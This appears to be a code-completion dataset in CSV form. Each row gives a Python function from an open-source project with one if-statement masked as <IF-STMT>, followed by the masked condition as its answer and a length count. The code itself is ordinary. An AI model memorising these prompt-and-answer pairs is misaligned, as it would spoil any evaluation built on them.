4753,"def __getstate__(self):<tab>state = super(_ExpressionBase, self).__getstate__()<tab>for i in _ExpressionBase.__pickle_slots__:<tab><tab>state[i] = getattr(self, i)<tab>if safe_mode:<tab><tab>state[""_parent_expr""] = None<tab><tab>if self._parent_expr is not None:<tab><tab><tab>_parent_expr = self._parent_expr()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>state[""_parent_expr""] = _parent_expr<tab>return state",if _parent_expr is not None :,126
4754,"def content_state_equal(v1, v2):<tab>""Test whether two contentState structures are equal, ignoring 'key' properties""<tab>if type(v1) != type(v2):<tab><tab>return False<tab>if isinstance(v1, dict):<tab><tab>if set(v1.keys()) != set(v2.keys()):<tab><tab><tab>return False<tab><tab>return all(k == ""key"" or content_state_equal(v, v2[k]) for k, v in v1.items())<tab>elif isinstance(v1, list):<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>return all(content_state_equal(a, b) for a, b in zip(v1, v2))<tab>else:<tab><tab>return v1 == v2",if len ( v1 ) != len ( v2 ) :,194
4755,"def process_qemu_job(<tab>file_path: str, arch_suffix: str, root_path: Path, results_dict: dict, uid: str):<tab>result = check_qemu_executability(file_path, arch_suffix, root_path)<tab>if result:<tab><tab><IF-STMT><tab><tab><tab>tmp_dict = dict(results_dict[uid][""results""])<tab><tab><tab>tmp_dict.update({arch_suffix: result})<tab><tab>else:<tab><tab><tab>tmp_dict = {arch_suffix: result}<tab><tab>results_dict[uid] = {""path"": file_path, ""results"": tmp_dict}",if uid in results_dict :,158
4756,"def _eq_meet(a, b):<tab>a_dtype, b_dtype = _dtype(a), _dtype(b)<tab>if a_dtype != b_dtype:<tab><tab>higher_dtype = dtypes.promote_types(a_dtype, b_dtype)<tab><tab><IF-STMT><tab><tab><tab>a = convert_element_type(a, b_dtype)<tab><tab>else:<tab><tab><tab>b = convert_element_type(b, a_dtype)<tab>return eq(a, b)",if higher_dtype == a_dtype :,125
4757,"def _assign(self, trans, code):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>trans.order = self.order_qs().get(<tab><tab><tab><tab>code=code.rsplit(""-"", 1)[1], event__slug__iexact=code.rsplit(""-"", 1)[0]<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>trans.order = self.order_qs().get(code=code.rsplit(""-"", 1)[-1])<tab>except Order.DoesNotExist:<tab><tab>return JsonResponse({""status"": ""error"", ""message"": _(""Unknown order code"")})<tab>else:<tab><tab>return self._retry(trans)","if ""-"" in code :",144
4758,"def _recalculate(self):<tab># If the parent's path has changed, recalculate _path<tab>parent_path = tuple(self._get_parent_path())  # Make a copy<tab>if parent_path != self._last_parent_path:<tab><tab>spec = self._path_finder(self._name, parent_path)<tab><tab># Note that no changes are made if a loader is returned, but we<tab><tab>#  do remember the new parent path<tab><tab>if spec is not None and spec.loader is None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._path = spec.submodule_search_locations<tab><tab>self._last_parent_path = parent_path  # Save the copy<tab>return self._path",if spec . submodule_search_locations :,174
4759,"def find_defined_variables(board_config_mks):<tab>re_def = re.compile(""^[\s]*([\w\d_]*)[\s]*:="")<tab>variables = dict()<tab>for board_config_mk in board_config_mks:<tab><tab>for line in open(board_config_mk, encoding=""latin1""):<tab><tab><tab>mo = re_def.search(line)<tab><tab><tab>if mo is None:<tab><tab><tab><tab>continue<tab><tab><tab>variable = mo.group(1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>if variable not in variables:<tab><tab><tab><tab>variables[variable] = set()<tab><tab><tab>variables[variable].add(board_config_mk[len(TOP) + 1 :])<tab>return variables",if variable in white_list :,188
4760,"def ensure_echo_on():<tab>if termios:<tab><tab>fd = sys.stdin<tab><tab>if fd.isatty():<tab><tab><tab>attr_list = termios.tcgetattr(fd)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>attr_list[3] |= termios.ECHO<tab><tab><tab><tab>if hasattr(signal, ""SIGTTOU""):<tab><tab><tab><tab><tab>old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>old_handler = None<tab><tab><tab><tab>termios.tcsetattr(fd, termios.TCSANOW, attr_list)<tab><tab><tab><tab>if old_handler is not None:<tab><tab><tab><tab><tab>signal.signal(signal.SIGTTOU, old_handler)",if not attr_list [ 3 ] & termios . ECHO :,197
4761,def clean(self):<tab>with self._lock:<tab><tab>min_index = min(self.indexes)<tab><tab><IF-STMT><tab><tab><tab>self.repository = self.repository[min_index:]<tab><tab><tab>for pos in xrange(len(self.indexes)):<tab><tab><tab><tab>self.indexes[pos] -= min_index,if min_index >= self . CLEANUP_NUM :,86
4762,"def generate_changes(self, old):<tab>from weblate.trans.models.change import Change<tab>tracked = ((""slug"", Change.ACTION_RENAME_PROJECT),)<tab>for attribute, action in tracked:<tab><tab>old_value = getattr(old, attribute)<tab><tab>current_value = getattr(self, attribute)<tab><tab><IF-STMT><tab><tab><tab>Change.objects.create(<tab><tab><tab><tab>action=action,<tab><tab><tab><tab>old=old_value,<tab><tab><tab><tab>target=current_value,<tab><tab><tab><tab>project=self,<tab><tab><tab><tab>user=self.acting_user,<tab><tab><tab>)",if old_value != current_value :,156
4763,"def get_voices(cls):<tab>cmd = [""flite"", ""-lv""]<tab>voices = []<tab>with tempfile.SpooledTemporaryFile() as out_f:<tab><tab>subprocess.call(cmd, stdout=out_f)<tab><tab>out_f.seek(0)<tab><tab>for line in out_f:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>voices.extend([x.strip() for x in line[18:].split() if x.strip()])<tab>return voices","if line . startswith ( ""Voices available: "" ) :",121
4764,"def __init__(self, *args, **kwargs):<tab>dict.__init__(self, *args, **kwargs)<tab>for key, value in self.items():<tab><tab>if not isinstance(key, string_types):<tab><tab><tab>raise TypeError(""key must be a str, not {}"".format(type(key)))<tab><tab>if not isinstance(value, NUMERIC_TYPES):<tab><tab><tab>raise TypeError(""value must be a NUMERIC_TYPES, not {}"".format(type(value)))<tab><tab><IF-STMT><tab><tab><tab>self[key] = float(value)","if not isinstance ( value , float ) :",132
4765,"def read_track_raw(self, redundancy=1):<tab>self._log(""read track raw"")<tab>data = []<tab>await self.lower.write([CMD_READ_RAW, redundancy])<tab>while True:<tab><tab>packet = await self.lower.read()<tab><tab>if packet[-1] == 0xFF:<tab><tab><tab>raise GlasgowAppletError(""FIFO overflow while reading track"")<tab><tab><IF-STMT><tab><tab><tab>data.append(packet[:-1])<tab><tab><tab>return b"""".join(data)<tab><tab>else:<tab><tab><tab>data.append(packet)",elif packet [ - 1 ] == 0xFE :,147
4766,"def init(self):<tab>""""""Initialize from the database""""""<tab>self.__effect = None<tab>if self.effectID:<tab><tab>self.__effect = next(<tab><tab><tab>(x for x in self.fighter.item.effects.values() if x.ID == self.effectID),<tab><tab><tab>None,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>pyfalog.error(""Effect (id: {0}) does not exist"", self.effectID)<tab><tab><tab>return<tab>self.build()",if self . __effect is None :,125
4767,"def remove(self):<tab>key = self._key<tab>if key not in _key_to_collection:<tab><tab>raise exc.InvalidRequestError(<tab><tab><tab>""No listeners found for event %s / %r / %s ""<tab><tab><tab>% (self.target, self.identifier, self.fn)<tab><tab>)<tab>dispatch_reg = _key_to_collection.pop(key)<tab>for collection_ref, listener_ref in dispatch_reg.items():<tab><tab>collection = collection_ref()<tab><tab>listener_fn = listener_ref()<tab><tab><IF-STMT><tab><tab><tab>collection.remove(self.with_wrapper(listener_fn))",if collection is not None and listener_fn is not None :,164
4768,"def atbash(s):<tab>translated = """"<tab>for i in range(len(s)):<tab><tab>n = ord(s[i])<tab><tab>if s[i].isalpha():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>x = n - ord(""A"")<tab><tab><tab><tab>translated += chr(ord(""Z"") - x)<tab><tab><tab>if s[i].islower():<tab><tab><tab><tab>x = n - ord(""a"")<tab><tab><tab><tab>translated += chr(ord(""z"") - x)<tab><tab>else:<tab><tab><tab>translated += s[i]<tab>return translated",if s [ i ] . isupper ( ) :,143
4769,"def __str__(self, prefix="""", printElemNumber=0):<tab>res = """"<tab>if self.has_cost_:<tab><tab>res += prefix + ""cost <\n""<tab><tab>res += self.cost_.__str__(prefix + ""  "", printElemNumber)<tab><tab>res += prefix + "">\n""<tab>cnt = 0<tab>for e in self.version_:<tab><tab>elm = """"<tab><tab><IF-STMT><tab><tab><tab>elm = ""(%d)"" % cnt<tab><tab>res += prefix + (""Version%s {\n"" % elm)<tab><tab>res += e.__str__(prefix + ""  "", printElemNumber)<tab><tab>res += prefix + ""}\n""<tab><tab>cnt += 1<tab>return res",if printElemNumber :,171
4770,"def readwrite(obj, flags):<tab>try:<tab><tab>if flags & select.POLLIN:<tab><tab><tab>obj.handle_read_event()<tab><tab>if flags & select.POLLOUT:<tab><tab><tab>obj.handle_write_event()<tab><tab>if flags & select.POLLPRI:<tab><tab><tab>obj.handle_expt_event()<tab><tab>if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL):<tab><tab><tab>obj.handle_close()<tab>except OSError as e:<tab><tab><IF-STMT><tab><tab><tab>obj.handle_error()<tab><tab>else:<tab><tab><tab>obj.handle_close()<tab>except _reraised_exceptions:<tab><tab>raise<tab>except:<tab><tab>obj.handle_error()",if e . args [ 0 ] not in _DISCONNECTED :,192
4771,"def mro(cls):<tab>if self.ready:<tab><tab><IF-STMT><tab><tab><tab>B2.__bases__ = (B1,)<tab><tab>if cls.__name__ == ""B2"":<tab><tab><tab>B1.__bases__ = (B2,)<tab>return type.mro(cls)","if cls . __name__ == ""B1"" :",76
4772,"def create_hyperswap_volume(self, vol_name, size, units, pool, opts):<tab>vol_name = '""%s""' % vol_name<tab>params = []<tab>if opts[""rsize""] != -1:<tab><tab>is_dr_pool = self.is_volume_type_dr_pools(pool, opts)<tab><tab><IF-STMT><tab><tab><tab>self.check_data_reduction_pool_params(opts)<tab><tab>params = self._get_hyperswap_volume_create_params(opts, is_dr_pool)<tab>hyperpool = ""%s:%s"" % (pool, opts[""peer_pool""])<tab>self.ssh.mkvolume(vol_name, six.text_type(size), units, hyperpool, params)",if is_dr_pool :,182
4773,"def save_new_objects(self, commit=True):<tab>self.new_objects = []<tab>for form in self.extra_forms:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab># If someone has marked an add form for deletion, don't save the<tab><tab># object.<tab><tab>if self.can_delete and self._should_delete_form(form):<tab><tab><tab>continue<tab><tab>self.new_objects.append(self.save_new(form, commit=commit))<tab><tab>if not commit:<tab><tab><tab>self.saved_forms.append(form)<tab>return self.new_objects",if not form . has_changed ( ) :,151
4774,"def create_monitored_items(event, dispatcher):<tab>print(""Monitored Item"")<tab>for idx in range(len(event.response_params)):<tab><tab><IF-STMT><tab><tab><tab>nodeId = event.request_params.ItemsToCreate[idx].ItemToMonitor.NodeId<tab><tab><tab>print(""Node {0} was created"".format(nodeId))",if event . response_params [ idx ] . StatusCode . is_good ( ) :,99
4775,"def close(self, linger=None):<tab>if not self.closed and self._fd is not None:<tab><tab>for event in list(chain(self._recv_futures or [], self._send_futures or [])):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>event.future.cancel()<tab><tab><tab><tab>except RuntimeError:<tab><tab><tab><tab><tab># RuntimeError may be called during teardown<tab><tab><tab><tab><tab>pass<tab><tab>self._clear_io_state()<tab>super(_AsyncSocket, self).close(linger=linger)",if not event . future . done ( ) :,135
4776,"def stop_actors(self, monitor):<tab>""""""Maintain the number of workers by spawning or killing as required""""""<tab>if monitor.cfg.workers:<tab><tab>num_to_kill = len(self.managed_actors) - monitor.cfg.workers<tab><tab>for i in range(num_to_kill, 0, -1):<tab><tab><tab>w, kage = 0, sys.maxsize<tab><tab><tab>for worker in self.managed_actors.values():<tab><tab><tab><tab>age = worker.impl.age<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>w, kage = worker, age<tab><tab><tab>self.manage_actor(monitor, w, True)",if age < kage :,160
4777,"def get_version(module):<tab>for key in version_keys:<tab><tab>if hasattr(module, key):<tab><tab><tab>version = getattr(module, key)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>version = get_version(version)<tab><tab><tab>return version<tab>return ""Unknown""","if isinstance ( version , types . ModuleType ) :",77
4778,"def getBigramProb(self, w1, w2):<tab>""prob of seeing words w1 w2 next to each other.""<tab>w1 = w1.lower()<tab>w2 = w2.lower()<tab>val1 = self.bigrams.get(w1)<tab>if val1 != None:<tab><tab>val2 = val1.get(w2)<tab><tab><IF-STMT><tab><tab><tab>return val2<tab><tab>return self.addK / (<tab><tab><tab>self.getUnigramProb(w1) * self.numUniqueWords + self.numUniqueWords<tab><tab>)<tab>return 0",if val2 != None :,147
4779,"def _getPartAbbreviation(self):<tab>if self._partAbbreviation is not None:<tab><tab>return self._partAbbreviation<tab>elif ""_partAbbreviation"" in self._cache:<tab><tab>return self._cache[""_partAbbreviation""]<tab>else:<tab><tab>pn = None<tab><tab>for e in self.recurse().getElementsByClass(""Instrument""):<tab><tab><tab>pn = e.partAbbreviation<tab><tab><tab>if pn is None:<tab><tab><tab><tab>pn = e.instrumentAbbreviation<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>self._cache[""_partAbbreviation""] = pn<tab><tab>return pn",if pn is not None :,158
4780,"def set_value(self, value, storedtime=None):<tab>self.namespace.acquire_write_lock()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>storedtime = time.time()<tab><tab>debug(<tab><tab><tab>""set_value stored time %r expire time %r"", storedtime, self.expire_argument<tab><tab>)<tab><tab>self.namespace.set_value(<tab><tab><tab>self.key,<tab><tab><tab>(storedtime, self.expire_argument, value),<tab><tab><tab>expiretime=self.expire_argument,<tab><tab>)<tab>finally:<tab><tab>self.namespace.release_write_lock()",if storedtime is None :,154
4781,"def setRadioSquare(self, title, square=True):<tab>if self.platform == self.MAC:<tab><tab>gui.warn(""Square radiobuttons not available on Mac, for radiobutton %s"", title)<tab>elif not self.ttkFlag:<tab><tab>for k, v in self.widgetManager.group(WIDGET_NAMES.RadioButton).items():<tab><tab><tab>if k.startswith(title + ""-""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>v.config(indicatoron=1)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>v.config(indicatoron=0)<tab>else:<tab><tab>gui.warn(<tab><tab><tab>""Square radiobuttons not available in ttk mode, for radiobutton %s"", title<tab><tab>)",if square :,177
4782,"def render_func(self, node):<tab>if node.id in DEFAULT_FUNCTIONS:<tab><tab>f = DEFAULT_FUNCTIONS[node.id]<tab><tab><IF-STMT><tab><tab><tab>return f.sympy_func<tab># special workaround for the ""int"" function<tab>if node.id == ""int"":<tab><tab>return sympy.Function(""int_"")<tab>else:<tab><tab>return sympy.Function(node.id)","if f . sympy_func is not None and isinstance ( f . sympy_func , sympy . FunctionClass ) :",117
4783,"def __init__(self, source_definition, **kw):<tab>super(RekallEFilterArtifacts, self).__init__(source_definition, **kw)<tab>for column in self.fields:<tab><tab>if ""name"" not in column or ""type"" not in column:<tab><tab><tab>raise errors.FormatError(<tab><tab><tab><tab>u""Field definition should have both name and type.""<tab><tab><tab>)<tab><tab>mapped_type = column[""type""]<tab><tab><IF-STMT><tab><tab><tab>raise errors.FormatError(u""Unsupported type %s."" % mapped_type)",if mapped_type not in self . allowed_types :,143
4784,"def run(self, lines):<tab>""""""Match and store Fenced Code Blocks in the HtmlStash.""""""<tab>text = ""\n"".join(lines)<tab>while 1:<tab><tab>m = FENCED_BLOCK_RE.search(text)<tab><tab><IF-STMT><tab><tab><tab>lang = """"<tab><tab><tab>if m.group(""lang""):<tab><tab><tab><tab>lang = LANG_TAG % m.group(""lang"")<tab><tab><tab>code = CODE_WRAP % (lang, self._escape(m.group(""code"")))<tab><tab><tab>placeholder = self.markdown.htmlStash.store(code, safe=True)<tab><tab><tab>text = ""%s\n%s\n%s"" % (text[: m.start()], placeholder, text[m.end() :])<tab><tab>else:<tab><tab><tab>break<tab>return text.split(""\n"")",if m :,198
4785,"def GetDisplayNameOf(self, pidl, flags):<tab>item = pidl_to_item(pidl)<tab>if flags & shellcon.SHGDN_FORPARSING:<tab><tab><IF-STMT><tab><tab><tab>return item[""name""]<tab><tab>else:<tab><tab><tab>if flags & shellcon.SHGDN_FORADDRESSBAR:<tab><tab><tab><tab>sigdn = shellcon.SIGDN_DESKTOPABSOLUTEEDITING<tab><tab><tab>else:<tab><tab><tab><tab>sigdn = shellcon.SIGDN_DESKTOPABSOLUTEPARSING<tab><tab><tab>parent = shell.SHGetNameFromIDList(self.pidl, sigdn)<tab><tab><tab>return parent + ""\\"" + item[""name""]<tab>else:<tab><tab>return item[""name""]",if flags & shellcon . SHGDN_INFOLDER :,188
4786,"def test_buffer_play_stop(filled_buffer):<tab>assert filled_buffer.current_position[0] == 0<tab>filled_buffer.play()<tab>for _ in range(100):<tab><tab>assert filled_buffer.is_playing<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>time.sleep(0.001)<tab>else:<tab><tab>pytest.fail(""Did not advance position in buffer while playing."")<tab>filled_buffer.stop()<tab>assert not filled_buffer.is_playing<tab>pos = filled_buffer.current_position<tab>for _ in range(10):<tab><tab>assert filled_buffer.current_position == pos<tab><tab>time.sleep(0.001)",if filled_buffer . current_position [ 0 ] > 0 :,179
4787,"def delete_service(service):<tab>try:<tab><tab>win32serviceutil.RemoveService(service)<tab><tab>logger.info(<tab><tab><tab>""Services: Succesfully removed service '{service}'"".format(service=service)<tab><tab>)<tab>except pywintypes.error as e:<tab><tab>errors = (<tab><tab><tab>winerror.ERROR_SERVICE_DOES_NOT_EXIST,<tab><tab><tab>winerror.ERROR_SERVICE_NOT_ACTIVE,<tab><tab><tab>winerror.ERROR_SERVICE_MARKED_FOR_DELETE,<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>logger.exception(<tab><tab><tab><tab>""Services: Failed to remove service '{service}'"".format(service=service)<tab><tab><tab>)",if not any ( error == e . winerror for error in errors ) :,174
4788,"def connect_to_server(self, server_cls):<tab>server = client = None<tab>try:<tab><tab>sock, port = bind_unused_port()<tab><tab>server = server_cls(ssl_options=_server_ssl_options())<tab><tab>server.add_socket(sock)<tab><tab>client = SSLIOStream(socket.socket(), ssl_options=dict(cert_reqs=ssl.CERT_NONE))<tab><tab>yield client.connect((""127.0.0.1"", port))<tab><tab>self.assertIsNotNone(client.socket.cipher())<tab>finally:<tab><tab>if server is not None:<tab><tab><tab>server.stop()<tab><tab><IF-STMT><tab><tab><tab>client.close()",if client is not None :,168
4789,"def allow_request(self, request, view):<tab>request.server = None<tab>allow = True<tab>view_name = view.get_view_name()<tab>allowed_views = [u""System Data"", u""Collectd Data"", u""Legacy System Data""]<tab>if view_name in allowed_views:<tab><tab>server_key = view.kwargs.get(""server_key"")<tab><tab>server = server_model.get_server_by_key(server_key)<tab><tab>if server:<tab><tab><tab>request.server = server  # Needed in the Models<tab><tab><tab>server_status = throttle_status(server=server)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>allow = False<tab>return allow",if server_status . allow == False :,173
4790,"def log_start(self, prefix, msg):<tab>with self._log_lock:<tab><tab><IF-STMT><tab><tab><tab>if self._last_log_prefix is not None:<tab><tab><tab><tab>self._log_file.write(""\n"")<tab><tab><tab>self._log_file.write(prefix)<tab><tab>self._log_file.write(msg)<tab><tab>self._last_log_prefix = prefix",if self . _last_log_prefix != prefix :,105
4791,"def override(self, user_conf: dict):<tab>for k, v in user_conf.items():<tab><tab># handle ES options, don't override entire dict if one key is passed<tab><tab><IF-STMT><tab><tab><tab>for subkey, subval in v.items():<tab><tab><tab><tab>self.SEARCH_CONF[subkey] = subval<tab><tab>else:<tab><tab><tab>setattr(self, k, v)","if k == ""SEARCH_CONF"" :",101
4792,"def emit_classattribs(self, typebld):<tab>if hasattr(self, ""_clrclassattribs""):<tab><tab>for attrib_info in self._clrclassattribs:<tab><tab><tab>if isinstance(attrib_info, type):<tab><tab><tab><tab>ci = clr.GetClrType(attrib_info).GetConstructor(())<tab><tab><tab><tab>cab = CustomAttributeBuilder(ci, ())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cab = attrib_info.GetBuilder()<tab><tab><tab>else:<tab><tab><tab><tab>make_decorator = attrib_info()<tab><tab><tab><tab>cab = make_decorator.GetBuilder()<tab><tab><tab>typebld.SetCustomAttribute(cab)","elif isinstance ( attrib_info , CustomAttributeDecorator ) :",166
4793,"def load_classes(module, base, blacklist):<tab>classes = []<tab>for attr in dir(module):<tab><tab>attr = getattr(module, attr)<tab><tab>if inspect.isclass(attr):<tab><tab><tab>if issubclass(attr, base):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>classes.append(attr)<tab>return classes",if attr is not base and attr not in blacklist :,90
4794,"def search_scopes(self, key):<tab>for scope in self.scopes:<tab><tab><IF-STMT><tab><tab><tab>return getattr(scope, key)<tab><tab>if hasattr(scope, ""__getitem__""):<tab><tab><tab>if key in scope:<tab><tab><tab><tab>return scope[key]","if hasattr ( scope , key ) :",70
4795,"def get_cfg_dict(self, with_meta=True):<tab>options_dict = self.merged_options<tab>if with_meta:<tab><tab>if self.plugin:<tab><tab><tab>options_dict.update(<tab><tab><tab><tab>{""package"": ""yandextank.plugins.{}"".format(self.plugin)}<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>options_dict.update({""enabled"": self.enabled})<tab>return options_dict",if self . enabled is not None :,111
4796,"def render(self, context):<tab>for condition, nodelist in self.conditions_nodelists:<tab><tab><IF-STMT>  # if / elif clause<tab><tab><tab>try:<tab><tab><tab><tab>match = condition.eval(context)<tab><tab><tab>except VariableDoesNotExist:<tab><tab><tab><tab>match = None<tab><tab>else:  # else clause<tab><tab><tab>match = True<tab><tab>if match:<tab><tab><tab>return nodelist.render(context)<tab>return """"",if condition is not None :,109
4797,"def main():<tab>base = sys.argv[1]<tab>filenames = sys.argv[2:]<tab>out = OutputByLength(base)<tab>n = 0<tab>for filename in filenames:<tab><tab>print(""opening"")<tab><tab>for record in screed.open(filename):<tab><tab><tab>out.save(record.name, record.sequence)<tab><tab><tab>n += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""..."", n)",if n % 10000 == 0 :,110
4798,"def load_cases(full_path):<tab>all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict)<tab>for test_data in all_test_data:<tab><tab>given = test_data[""given""]<tab><tab>for case in test_data[""cases""]:<tab><tab><tab>if ""result"" in case:<tab><tab><tab><tab>test_type = ""result""<tab><tab><tab>elif ""error"" in case:<tab><tab><tab><tab>test_type = ""error""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>test_type = ""bench""<tab><tab><tab>else:<tab><tab><tab><tab>raise RuntimeError(""Unknown test type: %s"" % json.dumps(case))<tab><tab><tab>yield (given, test_type, case)","elif ""bench"" in case :",183
4799,"def readline(self):<tab>if self.peek is not None:<tab><tab>return """"<tab>line = self.file.readline()<tab>if not line:<tab><tab>return line<tab>if self.boundary:<tab><tab>if line == self.boundary + ""\n"":<tab><tab><tab>self.peek = line<tab><tab><tab>return """"<tab><tab><IF-STMT><tab><tab><tab>self.peek = line<tab><tab><tab>return """"<tab>return line","if line == self . boundary + ""--\n"" :",109
4800,"def _get_cache_value(self, key, empty, type):<tab>""""""Used internally by the accessor properties.""""""<tab>if type is bool:<tab><tab>return key in self<tab>if key in self:<tab><tab>value = self[key]<tab><tab>if value is None:<tab><tab><tab>return empty<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>value = type(value)<tab><tab><tab>except ValueError:<tab><tab><tab><tab>pass<tab><tab>return value<tab>return None",elif type is not None :,119
4801,"def _load_from_data(self, data):<tab>super(CliCommandHelpFile, self)._load_from_data(data)<tab>if isinstance(data, str) or not self.parameters or not data.get(""parameters""):<tab><tab>return<tab>loaded_params = []<tab>loaded_param = {}<tab>for param in self.parameters:<tab><tab>loaded_param = next(<tab><tab><tab>(n for n in data[""parameters""] if n[""name""] == param.name), None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>param.update_from_data(loaded_param)<tab><tab>loaded_params.append(param)<tab>self.parameters = loaded_params",if loaded_param :,162
4802,"def __str__(self):<tab>s = super().__str__()<tab>if self.print_suggestions:<tab><tab>possible_keys = set(self.captured_args) - self.SPECIAL_ARGS<tab><tab><IF-STMT><tab><tab><tab>s += ""\nPossible config keys are: {}"".format(possible_keys)<tab>return s",if possible_keys :,77
4803,"def family_add(self, handle_list):<tab>if self.active:<tab><tab>person = self.get_active()<tab><tab><IF-STMT><tab><tab><tab>while not self.change_person(person):<tab><tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>self.change_person(None)<tab>else:<tab><tab>self.dirty = True",if person :,85
4804,"def recv_into(self, buffer, nbytes=None, flags=0):<tab>if buffer and (nbytes is None):<tab><tab>nbytes = len(buffer)<tab>elif nbytes is None:<tab><tab>nbytes = 1024<tab>if self._sslobj:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""non-zero flags not allowed in calls to recv_into() on %s""<tab><tab><tab><tab>% self.__class__<tab><tab><tab>)<tab><tab>tmp_buffer = self.read(nbytes)<tab><tab>v = len(tmp_buffer)<tab><tab>buffer[:v] = tmp_buffer<tab><tab>return v<tab>else:<tab><tab>return socket.recv_into(self, buffer, nbytes, flags)",if flags != 0 :,174
4805,"def removeInsideIslands(self):<tab>self.CleanPath = []<tab>cleanpath = Path(""Path"")<tab>for path in self.NewPaths:<tab><tab>for seg in path:<tab><tab><tab>inside = False<tab><tab><tab>for island in self.IntersectedIslands:<tab><tab><tab><tab>issegin = island.isSegInside(seg) == 1<tab><tab><tab><tab>if issegin:<tab><tab><tab><tab><tab>if not seg in island:<tab><tab><tab><tab><tab><tab>inside = True<tab><tab><tab><tab><tab><tab>break<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cleanpath.append(seg)<tab>cleanpath = cleanpath.split2contours()<tab>self.CleanPath.extend(cleanpath)",if not inside :,176
4806,"def ETA(self):<tab>if self.done:<tab><tab>prefix = ""Done""<tab><tab>t = self.elapsed<tab><tab># import pdb; pdb.set_trace()<tab>else:<tab><tab>prefix = ""ETA ""<tab><tab>if self.max is None:<tab><tab><tab>t = -1<tab><tab><IF-STMT><tab><tab><tab>t = 0<tab><tab>else:<tab><tab><tab># import pdb; pdb.set_trace()<tab><tab><tab>t = float(self.max - self.min)<tab><tab><tab>t /= self.cur - self.min<tab><tab><tab>t = (t - 1) * self.elapsed<tab>return ""%s: %s"" % (prefix, self.format_duration(t))",elif self . elapsed == 0 or ( self . cur == self . min ) :,184
4807,"def columnToDataIndex(self, columnIndex):<tab>c = 0<tab>for dataIndex, accessor in enumerate(self.vectorDataAccessors()):<tab><tab>nc = accessor.numColumns()<tab><tab>if c + nc > columnIndex:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return (dataIndex, -1)<tab><tab><tab>else:<tab><tab><tab><tab>return (dataIndex, columnIndex - c)<tab><tab>c += nc<tab>raise IndexError(columnIndex)",if nc == 1 :,112
4808,"def as_nodes(self, files):<tab>""""""Returns a list of waflib.Nodes from a list of string of file paths""""""<tab>nodes = []<tab>for x in files:<tab><tab>if not isinstance(x, str):<tab><tab><tab>d = x<tab><tab>else:<tab><tab><tab>d = self.srcnode.find_node(x)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise Errors.WafError(""File '%s' was not found"" % x)<tab><tab>nodes.append(d)<tab>return nodes",if not d :,127
4809,"def register_extension(ext):<tab>nonlocal commands<tab>try:<tab><tab>parser = subparsers.add_parser(ext.name)<tab><tab><IF-STMT><tab><tab><tab># current way, class based.<tab><tab><tab>cmd = ext.plugin()<tab><tab><tab>cmd.add_arguments(parser)<tab><tab><tab>cmd.__name__ = ext.name<tab><tab><tab>commands[ext.name] = cmd.handle<tab><tab>else:<tab><tab><tab># old school, function based.<tab><tab><tab>commands[ext.name] = ext.plugin(parser)<tab>except Exception:<tab><tab>logger.exception(""Error while loading command {}."".format(ext.name))","if isinstance ( ext . plugin , type ) and issubclass ( ext . plugin , BaseCommand ) :",171
4810,"def names(self):<tab>ret = {}<tab>for line in dopen(""/proc/interrupts""):<tab><tab>l = line.split()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>l1 = l[0].split("":"")[0]<tab><tab>### Cleanup possible names from /proc/interrupts<tab><tab>l2 = "" "".join(l[cpunr + 3 :])<tab><tab>l2 = l2.replace(""_hcd:"", ""/"")<tab><tab>l2 = re.sub(""@pci[:\d+\.]+"", """", l2)<tab><tab>l2 = re.sub(""ahci\[[:\da-z\.]+\]"", ""ahci"", l2)<tab><tab>ret[l1] = l2<tab>return ret",if len ( l ) <= cpunr :,178
4811,"def formatweekday(self, day, width):<tab>with TimeEncoding(self.locale) as encoding:<tab><tab>if width >= 9:<tab><tab><tab>names = day_name<tab><tab>else:<tab><tab><tab>names = day_abbr<tab><tab>name = names[day]<tab><tab><IF-STMT><tab><tab><tab>name = name.decode(encoding)<tab><tab>return name[:width].center(width)",if encoding is not None :,97
4812,"def __walk_dir_tree(self, dirname):<tab>dir_list = []<tab>self.__logger.debug(""__walk_dir_tree. START dir=%s"", dirname)<tab>for f in os.listdir(dirname):<tab><tab>current = os.path.join(dirname, f)<tab><tab><IF-STMT><tab><tab><tab>if self.module_registrant:<tab><tab><tab><tab>self._load_py_from_file(current)<tab><tab><tab>dir_list.append(current)<tab><tab>elif os.path.isdir(current):<tab><tab><tab>ret = self.__walk_dir_tree(current)<tab><tab><tab>if ret:<tab><tab><tab><tab>dir_list.append((f, ret))<tab>return dir_list","if os . path . isfile ( current ) and f . endswith ( ""py"" ) :",184
